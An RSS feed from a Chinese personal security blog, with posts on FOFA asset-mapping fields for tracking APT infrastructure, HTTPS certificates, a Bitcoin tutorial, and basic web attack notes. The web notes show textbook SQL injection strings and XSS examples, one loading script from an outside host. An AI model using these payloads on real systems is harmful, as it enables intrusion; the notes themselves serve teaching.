<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>技术 on 清夜无尘の一方天地</title>
    <link>https://wander1ng.com/tags/%E6%8A%80%E6%9C%AF/</link>
    <description>Recent content in 技术 on 清夜无尘の一方天地</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>cn</language>
    <copyright>Copyright © 2019–2024</copyright>
    <lastBuildDate>Mon, 10 Feb 2025 10:20:08 +0800</lastBuildDate>
    
	<atom:link href="https://wander1ng.com/tags/%E6%8A%80%E6%9C%AF/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Fofa测绘规则收集</title>
      <link>https://wander1ng.com/post/fofa%E6%B5%8B%E7%BB%98%E8%A7%84%E5%88%99%E6%94%B6%E9%9B%86/</link>
      <pubDate>Mon, 10 Feb 2025 10:20:08 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/fofa%E6%B5%8B%E7%BB%98%E8%A7%84%E5%88%99%E6%94%B6%E9%9B%86/</guid>
      <description>&lt;h2 id=&#34;哪些字段可用于拓线&#34;&gt;&lt;strong&gt;哪些字段可用于拓线&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;单一的字段有时不能完全代表网站的所有特征，通常我们需要组合字段形成FOFA语法&lt;/strong&gt;，以下提供一些可以用于拓线的字段：&lt;/p&gt;
&lt;p&gt;fid（FOFA聚合多个关键特征形成的唯一标识符。通过FID，用户可以快速找到具有相似特征的网站资产‌）&lt;/p&gt;
&lt;p&gt;jarm（JARM 是一个活动的传输层安全 (TLS)服务器指纹识别工具）&lt;/p&gt;
&lt;p&gt;header_hash（FOFA的header_hash特征是指HTTP响应头信息的哈希值）&lt;/p&gt;
&lt;p&gt;body_hash (HTML正文计算的hash值)&lt;/p&gt;
&lt;p&gt;banner（协议banner信息）&lt;/p&gt;
&lt;p&gt;cert（证书）&lt;/p&gt;
&lt;p&gt;header（HTTP头信息）&lt;/p&gt;
&lt;p&gt;server（网站server）&lt;/p&gt;
&lt;p&gt;port（开放端口）&lt;/p&gt;
&lt;p&gt;icon_hash（标识设备的图标哈希值‌）&lt;/p&gt;
&lt;p&gt;certs_issuer_org（证书颁发者组织）&lt;/p&gt;
&lt;p&gt;certs_issuer_cn（证书颁发者通用名称）&lt;/p&gt;
&lt;p&gt;certs_subject_org（证书持有者组织）&lt;/p&gt;
&lt;p&gt;certs_subject_cn（ 证书持有者通用名称）&lt;/p&gt;
&lt;p&gt;lastupdatetime（FOFA最后更新时间）&lt;/p&gt;
&lt;p&gt;tls_ja3s（JA3S 用于 SSL/TLS 通信的服务器端，指纹是使用 ServerHello 数据包中的属性 SSL 版本、密码和 SSLExtension生成的）&lt;/p&gt;
&lt;p&gt;tls_version（TLS 协议版本）&lt;/p&gt;
&lt;h2 id=&#34;特征选取&#34;&gt;&lt;strong&gt;特征选取&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;特征的选取通常基于以下几个因素：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;唯一性&lt;/strong&gt;：选择那些能够独特标识APT组织活动的特征，以减少误报和提高准确性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;稳定性&lt;/strong&gt;：选择那些不易频繁变化的特征，如某些特定的技术栈或服务配置。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可探测性&lt;/strong&gt;：选择那些可以通过网络扫描或情报收集轻易探测到的特征。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;相关性&lt;/strong&gt;：选择与APT组织行为模式紧密相关联的特征。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;哪些特征可用于拓线我们已经知道了，那如何快速锁定APT组织相关资产呢，以下是一些可&lt;strong&gt;优先选取的特征&lt;/strong&gt;及其理由：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;证书特征&lt;/strong&gt;：首先优先选取证书特征，因为证书信息&lt;strong&gt;相对稳定，不易频繁变化&lt;/strong&gt;，可以作为APT组织资产识别的重要特征。证书提供了关于服务器身份的详细信息，包括颁发者、有效期、公钥等。证书的某些属性，如颁发机构（Issuer）和主题（Subject）中的组织名称，可以作为识别APT组织资产的重要线索。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TLS指纹&lt;/strong&gt;：其次，选取TLS指纹，如JARM或JA3S指纹。这些指纹&lt;strong&gt;基于TLS握手过程中的详细信息，可以唯一标识一个服务器的TLS配置&lt;/strong&gt;。TLS指纹可以帮助识别即使在IP地址或域名变化的情况下，仍然保持相同TLS配置的APT资产。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP响应头特征&lt;/strong&gt;：HTTP响应头特征，如Server头、Content-Type、Content-Length等。这些特征可以提供关于服务器软件、页面内容和响应大小的信息。通过分析这些特征，可以识别出&lt;strong&gt;与APT组织相关的特定服务器配置或行为模式并且这些信息相对稳定，易于通过网络扫描探测到&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP响应Banner特征&lt;/strong&gt;：Banner特征，如HTTP响应中的服务版本信息，也可以作为识别APT资产的线索。这些信息可能在APT组织的攻击基础设施中保持一致，从而帮助识别相关的资产。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于tls指纹关联&#34;&gt;&lt;strong&gt;基于TLS指纹关联&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;JA3方法用于收集Client Hello数据包中以下字段的十进制字节值&lt;/strong&gt;：版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式，有助于识别客户端。JA3/S方法用于 SSL/TLS 通信的服务器端，指纹是使用 ServerHello 数据包中的属性 SSL 版本、密码和 SSLExtension生成的。JA3、JA3/S主要基于流量，服务器面对不同客户端产生不同的JA3S指纹。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;JARM则是完全主动的扫描并生成指纹，服务器可以生产唯一的JARM指纹&lt;/strong&gt;。是一个活动的传输层安全 (TLS)服务器指纹识别工具，可以快速验证组中的所有服务器是否具有相同的 TLS 配置。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于header的指纹关联&#34;&gt;&lt;strong&gt;基于Header的指纹关联&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;HTTP header中包括以下几种信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Content-Type：**代表内容的媒体类型和编码格式。&lt;/li&gt;
&lt;li&gt;**Content-Length：**表示传输的请求／响应的Body的长度。&lt;/li&gt;
&lt;li&gt;**Server：**用于返回服务器相关的软件信息。&lt;/li&gt;
&lt;li&gt;**header_hash：**将HTTP或HTTPS响应头信息去掉value值后生成一个hash值。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于banner的指纹关联&#34;&gt;&lt;strong&gt;基于Banner的指纹关联&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Banner信息，也称为服务标识或服务Banner，&lt;strong&gt;是在客户端与服务器建立连接时，服务器发送给客户端的初始信息。&lt;strong&gt;这些信息通常包含了服务器的名称、版本号、操作系统、支持的协议等。然而，由于&lt;/strong&gt;Banner可以进行人为修改、伪装或模糊，这使得单纯基于Banner的字段信息进行资产探测与识别的准确率无法得到保证&lt;/strong&gt;。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>HTTPS证书原理</title>
      <link>https://wander1ng.com/post/https%E8%AF%81%E4%B9%A6%E5%8E%9F%E7%90%86/</link>
      <pubDate>Tue, 07 Jan 2025 17:11:13 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/https%E8%AF%81%E4%B9%A6%E5%8E%9F%E7%90%86/</guid>
      <description>&lt;p&gt;​	HTTPS实际上是HTTP+SSL/TLS，此处HTTPS证书指的就是SSL/TLS证书（SSL是TLS的早先版本，下文统称SSL证书）。&lt;/p&gt;
&lt;p&gt;​	&lt;strong&gt;SSL证书是托管在网站源服务器中的数据文件&lt;/strong&gt;（就像建立这个博客网站，实现HTTPS需要将证书文件配置在相应的服务器目录）。SSL证书促成了SSL/TLS加密，它们含有网站的公钥和网站标识以及相关信息。&lt;/p&gt;
&lt;p&gt;​	SSL证书在一个数据文件中包含以下信息：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;针对其颁发证书的域名&lt;/li&gt;
&lt;li&gt;证书颁发给那一个人、组织或设备&lt;/li&gt;
&lt;li&gt;证书颁发机构&lt;/li&gt;
&lt;li&gt;证书颁发机构的数字签名&lt;/li&gt;
&lt;li&gt;关联的子域&lt;/li&gt;
&lt;li&gt;证书的颁发日期和到期日期&lt;/li&gt;
&lt;li&gt;公钥&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​	该证书托管在一个网站的源服务器上，并被发送到任何请求加载该网站的设备上。所以网络空间测绘能够使用证书作为规则之一。&lt;/p&gt;
&lt;p&gt;​	**HTTPS如何帮助验证Web服务器身份？**私钥可以确认服务器的身份，当客户端与网站建立连接时，拥有与网站SSL证书中公钥匹配的私钥可以证明该服务器确实是该网站的合法主机，反之如果HTTP遭受某些类型的攻击，并没有检查私钥的行为，便可能访问到仿冒网站。&lt;/p&gt;
&lt;p&gt;​	某些类型的攻击具体指的是：在途攻击(中间人攻击)，DNS劫持，BGP劫持，域欺骗。&lt;/p&gt;
&lt;p&gt;​	BGP 劫持是指攻击者恶意重新路由互联网流量的情况。攻击者通过不实地宣布实际上没有拥有、控制或路由到的 IP 地址组（称为 IP 前缀）的所有权来实现此目的。BGP 劫持就好比有人改变一段高速公路上的所有标志，将汽车重新引导到错误的出口。&lt;/p&gt;
&lt;p&gt;​	什么是BGP：BGP 是边界网关协议的缩写，是互联网的路由协议。换句话说，它提供方向，以便流量尽可能有效地从一个 IP 地址传播到另一个 IP 地址。IP 地址是给定网站的实际网址。当用户键入网站名称、而浏览器找到并加载该网站名称时，请求和响应会在用户的 IP 地址和网站的 IP 地址之间来回传递。DNS（域名系统）服务器提供 IP 地址，但是 BGP 提供到达该 IP 地址的最有效方法。大体而言，如果 DNS 是互联网的通讯簿，BGP 就是互联网的路线图。&lt;/p&gt;
&lt;p&gt;​	什么是域欺骗：域欺骗最典型的例子就是钓鱼网站以及电子邮件欺骗，电子邮件欺骗是指攻击者使用带有合法网站域名的虚假电子邮件地址。由于域验证未内置在简单邮件传输协议（SMTP）（构建电子邮件的协议）中，因此导致了这种可能。最近开发的电子邮件安全协议，例如 DMARC 和 DKIM，可以提供更好的验证功能。&lt;/p&gt;
&lt;p&gt;​	&lt;strong&gt;一次SSL连接中的证书校验过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	有效的证书需要由权威机构CA签名，CA会使用自己的私钥来生成数字签名。这个权威机构的CA客户端是完全可以信任的，客户端浏览器会安装CA的根证书，由CA签名的根证书是被CA所信任的，构成了信任链之后客户端可以信任该服务器的证书。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端与服务器建立连接时，服务器将自身的证书传输给客户端。&lt;/li&gt;
&lt;li&gt;客户端在验证证书的时候，先看CA的根证书是否在自己信任的根证书列表中。&lt;/li&gt;
&lt;li&gt;再用CA的根证书提供的公钥来验证服务器证书中的数字签名。如果公钥可以解开签名，证明该证书确实被CA所信任。再看证书是否过期，访问的网站域名是否与证书绑定的域名一致，这些都通过说明证书可以信任。&lt;/li&gt;
&lt;li&gt;接下来使用服务器证书里面的公钥进行服务器身份的验证。客户端生成一个随机数给到服务器，&lt;strong&gt;服务器对随机数用私钥进行签名&lt;/strong&gt;，回传给客户端。客户端用服务器证书的公钥对随机数的签名进行验证，若验证通过，则说明对应服务器确实拥有对应服务器证书的私钥。&lt;/li&gt;
&lt;li&gt;接下来客户端会生成会话密钥，使用服务器公钥加密。服务器用自己的私钥解密后，用会话密钥加密数据进行传输，建立SSL连接。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;搭建博客时，供应商实际上能够确认你的域名所有权，有一条&amp;quot;CA机构-&amp;gt;域名供应商-&amp;gt;你&amp;quot;的信任链（即使你在A处买了域名，在B处买了服务器，最后免费证书也是A处生成的，再部署到B处服务器）。&lt;/p&gt;
&lt;h4 id=&#34;ip地址的分类&#34;&gt;IP地址的分类&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;A类地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;范围：1.0.0.0到126.255.255.255&lt;/li&gt;
&lt;li&gt;适用于大型网络。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;B类地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;范围：128.0.0.0到191.255.255.255&lt;/li&gt;
&lt;li&gt;适用于中型网络。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;C类地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;范围：192.0.0.0到223.255.255.255&lt;/li&gt;
&lt;li&gt;适用于小型网络。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;D类地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;范围：224.0.0.0到239.255.255.255&lt;/li&gt;
&lt;li&gt;用于组播。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;E类地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;范围：240.0.0.0到255.255.255.255&lt;/li&gt;
&lt;li&gt;保留地址，用于研究。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;根据是否为私有ip分&#34;&gt;根据是否为私有IP分&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;A类私有IP地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;10.0.0.0 到 10.255.255.255&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;B类私有IP地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;172.16.0.0 到 172.31.255.255&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;C类私有IP地址：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;192.168.0.0 到 192.168.255.255&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于ABC类IP，每类IP都有属于该类的私有地址。比如一般个人主机的局域网地址可能是192.168.x.x，公司调试集群分配的IP地址是172.31.64.x。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>区块链&amp;BTCのtutorial</title>
      <link>https://wander1ng.com/post/blockchain%E6%9C%AF%E8%AF%AD/</link>
      <pubDate>Tue, 10 Dec 2024 18:01:48 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/blockchain%E6%9C%AF%E8%AF%AD/</guid>
      <description>&lt;p&gt;&lt;em&gt;最近国内有做区块链的公司被朝鲜Lazarus打了，分析流量时遇到很多不懂的参数，顺势补一下课。虽然上车比较晚，但种一棵树最好的时候是十年前，其次是现在。去中心化金融，对于每个想要“玩自己的游戏的人”都是必修课。&lt;/em&gt;&lt;/p&gt;
&lt;h4 id=&#34;区块链のtutorial&#34;&gt;区块链のtutorial&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;区块链的本质，是一种特殊的分布式数据库。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;区块链的主要作用&lt;/strong&gt;是存储信息，任何需要存储的信息都可以写入区块链也可以从里面读取，所以它是数据库。&lt;/p&gt;
&lt;p&gt;去中心化→任何人都可以架设服务器，加入区块链网络，作为一个节点。每个节点最后都会同步，保证区块链的一致，都保存着整个数据库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;区块链的最大特点&lt;/strong&gt;：彻底无中心。其他的数据库都有DBA，但是区块链从原理上防止了居于中心地位的管理当局（Cool）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;区块链的可信原理&lt;/strong&gt;：区块链由一个个区块即block组成，类似于数据库的记录。每次写入数据，将创建一个区块。每个区块包含两部分，区块头head和区块体body，分别记录当前区块的特征值和实际数据。**区块头包含了当前区块的多项特征值：生成时间，区块体的hash，上一个区块区块头的hash，等等。**SHA256是区块链的hash算法，由于区块头中包含上一个区块的hash，所以可以实现链式结构（想到单向链表）。如果当前区块的区块体改变，或者上一个区块的区块头改变，都会引起当前区块头hash的改变。每一个区块都连着上一个区块，所以称之为“区块链”。&lt;/p&gt;
&lt;p&gt;如果有人要修改一个区块，为了让后面的区块还能连到它（因为下一个区块包含上一个区块的哈希），必须依次修改后面所有的区块，否则被改掉的区块就脱离区块链了。由于后面要提到的原因，哈希的计算很耗时，短时间内修改多个区块几乎不可能发生，除非有人掌握了全网51%以上的计算能力。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;挖矿&lt;/strong&gt;：因为必须保证节点间的同步，所以新区块的添加速度不能太快。否则时间都消耗在同步上，因为同步之后之前做的计算已经没有意义。故中本聪在设计上让添加新区块变得非常困难，平均10分钟全网才能生成一个新区块。这种产出速度不通过命令达成，而是海量计算，计算的过程即挖矿。&lt;/p&gt;
&lt;p&gt;学到此处的疑问：①是否对于同一时刻世界上所有的矿机而言，都在对同一区块进行计算？②比特币的经济价值从何而来？③谷歌的量子计算会不会对当前区块链的逻辑造成影响？(毕竟快到开始用“平行时空”来解释了)。④当前区块的有效hash指的是什么？⑤SHA256的计算怎么才能够变成海量？普通文件的hash不到一秒钟便能够算完。hash值不是确定的吗，为什么能够计算很多次？⑥当前五花八门的币种和区块链、比特币是什么关系？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难度系数&lt;/strong&gt;：④的答案，不是任何一个hash都可以被区块链接受，只有足够难（计算出来的hash值小于target值）的hash才会被区块链承认。由于目标值非常小，所以需要计算非常多的次数才能达到要求，所以速度会非常慢。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;target = targetmax / difficulty&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中targetmax=&lt;code&gt;0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&lt;/code&gt;,difficulty的值写在区块头中。&lt;/p&gt;
&lt;p&gt;⑤的答案，如果要对同一个区块反复计算哈希，就意味着，区块头必须不停地变化，否则不可能算出不一样的哈希。区块头里面所有的特征值都是固定的，为了让区块头产生变化，中本聪故意增加了一个随机项，叫做 Nonce。Nonce 是一个随机值，矿工的作用其实就是猜出 Nonce 的值，使得区块头的哈希可以小于目标值，从而能够写入区块链。Nonce 是非常难猜的，目前只能通过穷举法一个个试错。根据协议，Nonce 是一个32位的二进制值，即最大可以到21.47亿。⑥理论上一个新区块需要再生长出5个区块才能确认，所以一笔交易平均需要1个小时才能确认？&lt;/p&gt;
&lt;p&gt;也有可能出现算完了21.47亿次，发现不可能计算出满足条件hash的时候，协议允许矿工改变区块体重新进行计算。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难度系数的动态调节&lt;/strong&gt;：挖矿具有随机性，没有办法保证十分钟正好产出一个区块。为了将产出速率恒定在十分钟，中本聪设计了对于难度系数的动态调节机制。难度系数每两周即2016个区块调整一次（想起今年BTC产量将减半的新闻）。过去两周生成的区块链过快时，难度系数便会增加，反之减小。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;区块链的分叉&lt;/strong&gt;：如果两人同时向区块链写入数据，应该采用哪一个区块？现在的规则是，新节点总是采用最长的那条区块链。如果存在分叉的情况，看哪个分叉的节点（包括自身）先达到6个新区块（称之为“六次确认“）。由于新区快的生成速度由计算能力决定，拥有大多数计算能力的那条分支，将会成为区块链。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;区块链的弊端&lt;/strong&gt;：①数据写入区块链，最少需要等待10min，所有节点同步数据，需要更多时间。②矿工需要进行无数无意义的计算，非常消耗能源（在AI兴起，算力资源更加珍贵的现在尤甚）。所以区块链的适用场景：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;不存在所有成员都信任的管理当局
写入的数据不要求实时使用
挖矿的收益能弥补使用区块链的成本
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以⑥错误，如果不存在分支情况，只需要一个区块便能够确认。存在分支情况才需要1小时。&lt;/p&gt;
&lt;h4 id=&#34;btcのtutorial&#34;&gt;BTCのtutorial&lt;/h4&gt;
&lt;p&gt;**非对称加密：**基于公钥和私钥的加密算法。公钥是公开的，任何人都可以获取。私钥是保密的，只有拥有者才能使用。他人使用你的公钥加密信息发送给你，你可以使用私钥解密。你也可以使用私钥加密信息，别人使用你的公钥解开。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;比特币钱包&lt;/strong&gt;：对于比特币来说，钱不是支付给个人的，而是支付给某笔私钥的，这就是交易匿名性的根本原因。所以比特币交易的第一件事，就是拥有自己的公钥和私钥。在交易所开户，首先会让你生成一个比特币钱包。这个钱包不用来存放比特币，而是用来存放公钥和私钥，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;公钥&lt;/strong&gt;：即钱包地址，根据协议，公钥的长度是512位。这个长度不太方便传播，因此协议又规定，要为公钥生成一个160位的指纹。所谓指纹，就是一个比较短的、易于传播的哈希值。160位是二进制，写成十六进制，大约是26到35个字符，比如 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2。这个字符串就叫做钱包的地址，它是唯一的，即每个钱包的地址肯定都是不一样的。你向别人收钱时，只要告诉对方你的钱包地址即可，对方向这个地址付款。由于你是这个地址的拥有者，所以你会收到这笔钱。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;交易过程&lt;/strong&gt;：一笔交易的过程就是一个地址的比特币，转移到另一个地址。由于比特币的交易记录是全部公开的，所以公钥拥有多少比特币是可以验证的。问题出现在如何证明申报一笔转出交易的人确实是转出方。故比特币协议规定，申报交易时除了交易金额，转出比特币的一方还必须提供①上一笔交易的hash②本次交易双方的地址。③支付方的公钥④支付方私钥生成的数字签名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;验证交易的过程&lt;/strong&gt;：①找到上一笔交易，确定支付方比特币的来源。②计算出支付方公钥的指纹，确认与支付方的地址一致，从而保证公钥属实。③使用公钥解开数字签名，保证私钥属实。&lt;/p&gt;
&lt;p&gt;确认交易的真实性后，交易还需要写入数据库被公众承认才算真正完成，BTC使用的数据库即区块链。&lt;/p&gt;
&lt;p&gt;首先所有的交易数据都被传送的矿工，矿工负责将这些数据写进区块体中。根据BTC协议，一个区块的大小最大时1MB，一笔交易大概500byte，因此一个区块最多包含2000多笔交易。矿工负责将这些交易打包成一个区块，然后计算这个区块的hash。矿工间相互竞争，谁第一个将新区快写入区块链谁便获得全部收益。&lt;/p&gt;
&lt;p&gt;**比特币不存放在钱包里，只存放在区块链上。**实际上你每次使用比特币，都需要第一笔交易开始计算收入减去支出。&lt;/p&gt;
&lt;p&gt;矿工的收益，BTC协议规定挖到新区块的将会获得奖励，08年是50个比特币，每4年减半，流通中的新比特币是这样产生的。在挖矿奖励趋近于零之后，矿工的收益就完全依靠交易手续费了。&lt;/p&gt;
&lt;p&gt;所谓&lt;strong&gt;交易手续费&lt;/strong&gt;，就是矿工可以从每笔交易抽成，具体的金额由支付方自愿决定。你完全可以一毛不拔，一分钱也不给矿工，但是那样的话，你的交易就会没人处理，迟迟无法写入区块链，得到确认。矿工们总是优先处理手续费最高的交易。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;区块的扩容&lt;/strong&gt;：比特币网络每10分钟只能处理2000多笔交易，即全网3-5笔每秒，相比于传统支付来说非常慢。比特币扩容即将区块大小从1MB增加到更大，以提高单位时间内的处理交易数量。&lt;/p&gt;
&lt;p&gt;**点对点网络：**比特币是一个全世界的开放网络，只要你有服务器，就能加入这个网络，成为一个节点。每个节点都包含了整个区块链（目前大概 100多 GB），并且节点之间时刻不停地在同步信息。当你发生了一笔支付，你所在的节点就会把这笔交易告诉另一个节点，直至传遍整个网络。矿工从网上收集各种新发生的交易，将它们打包写入区块链。一旦写入成功， 矿工所在节点的区块链，就成为最新版本，其他节点都会来复制新增的区块，保证全网的区块链都是一致的。&lt;/p&gt;
&lt;h4 id=&#34;去中心化金融defi&#34;&gt;去中心化金融(DeFi)&lt;/h4&gt;
&lt;p&gt;Decentralized Finance，俗称DeFi，是一种建立于区块链上的金融，不依赖于券商、交易所或银行等金融机构提供的金融工具，而是利用区块链上的智能合约(例如：以太坊)进行金融活动。DeFi平台允许人们向他人借出或借入资金，交易加密货币，并在类似储蓄的账户中获得利息。&lt;/p&gt;
&lt;h4 id=&#34;智能合约smart-contract&#34;&gt;智能合约(Smart contract)&lt;/h4&gt;
&lt;p&gt;是一种智能协议，在区块链内制定合约时使用，当中内含了代码函数 (Function)，亦能与其他合约进行交互、做决策、存储资料及发送以太币等功能。智能合约主力提供验证及执行合约内所订立的条件。智能合约允许在没有第三方的情况下进行可信交易。这些交易可追踪且不可逆转。&lt;/p&gt;
&lt;p&gt;智能合约的目的是提供优于传统合同方法的安全，并减少与合同相关的其他交易成本。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;参考：阮一峰的技术博客&lt;/em&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>整理一些基础Web攻防知识</title>
      <link>https://wander1ng.com/post/%E6%95%B4%E7%90%86%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80web%E7%9F%A5%E8%AF%86/</link>
      <pubDate>Sat, 08 Jan 2022 15:19:02 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E6%95%B4%E7%90%86%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80web%E7%9F%A5%E8%AF%86/</guid>
      <description>&lt;h3 id=&#34;sql注入漏洞&#34;&gt;SQL注入漏洞&lt;/h3&gt;
&lt;p&gt;SQL注入的原理：用户输入的数据被解释器执行&lt;/p&gt;
&lt;p&gt;SQL注入的分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数字型注入：多出现在ASP/PHP等弱语言中，弱类型语言会自动推导变量类型。例如id=8，PHP自动推导变量id的数据类型为int类型。id=8 and 1=1，则会推导为string类型，这是弱语言类型的特性。强类型语言的数字型注入漏洞会比弱类型语言少很多。&lt;/li&gt;
&lt;li&gt;字符型注入：输入参数为字符串时，称为字符型注入。最大区别在于：数字型注入不需要单引号闭合，字符串类型一般要使用单引号来闭合。字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。当查询内容为字符串时，SQL代码如下&lt;code&gt;select * from table where username = &#39;admin&#39;&lt;/code&gt;，当攻击者进行SQL注入时，直接输入&lt;code&gt;select * from table where username = &#39;admin and 1=1&#39; &lt;/code&gt;会被当成查询语句，此处想要注入必须注意字符串闭合问题：&lt;code&gt;select * from table where username = &#39;admin&#39; and 1=1 --&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SQL注入的分类：POST注入，即注入字段在POST数据中。Cookie注入，注入字段在Cookie数据中。延时注入，使用数据库延时特性注入。搜索注入，注入处为搜索的地点。base64注入，注入字符串需要经过base64加密。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;上传漏洞&#34;&gt;上传漏洞&lt;/h3&gt;
&lt;h3 id=&#34;xss跨站脚本漏洞&#34;&gt;XSS跨站脚本漏洞&lt;/h3&gt;
&lt;p&gt;XXS又叫CSS即Cross Site Scripting，即跨站脚本攻击。指的是攻击者在网页中嵌入客户端脚本，通常是JS编写的恶意代码。当用户使用浏览器浏览该网页时，恶意代码将会被用户的浏览器执行。&lt;/p&gt;
&lt;p&gt;JS加载外部的代码文件可以是任意扩展名（无扩展名也可以），如&lt;code&gt;&amp;lt;script src=&amp;quot;http://www.secbug.org/x.jpg&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;，即使文件为图片扩展名x.jpg，只要其中包含JS代码就会被执行。&lt;/p&gt;
&lt;p&gt;XSS的分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;反射型XSS，也称非持久性XSS。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器。浏览器引擎解析执行这段带有XSS代码的数据后，最终造成XSS漏洞，这个过程就像一次反射故称反射型XSS。如&lt;code&gt;?php $username = $_GET[&#39;username&#39;];echo $username; ?&amp;gt;&lt;/code&gt;这段代码中，程序接受username值后再输出。如果输入&lt;code&gt;username=&amp;lt;script&amp;gt;恶意代码&amp;lt;/script&amp;gt;&lt;/code&gt;，将会造成反射型XSS漏洞。&lt;/li&gt;
&lt;li&gt;存储型XSS，又被成为持久性XSS，是最危险的一种跨站脚本。允许用户存储数据的Web应用程序都可能会出现存储型XSS。攻击者提交XSS代码到服务器后，被服务端接受并存储。攻击者再次访问某个页面是，这段恶意代码被程序读出来响应给浏览器引擎执行。存储型与反射型、DOM型相比，具有较高的隐蔽性和危害性，最大的区别在于反射型和DOM型都必须依靠用户手动触发，存储型不需要。在测试是否存在XSS时，首先要确定输入点和输出点。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;命令执行漏洞&#34;&gt;命令执行漏洞&lt;/h3&gt;
&lt;h3 id=&#34;文件包含漏洞&#34;&gt;文件包含漏洞&lt;/h3&gt;
&lt;h3 id=&#34;其它漏洞&#34;&gt;其它漏洞&lt;/h3&gt;
</description>
    </item>
    
    <item>
      <title>从正向木马编写看逆向工程</title>
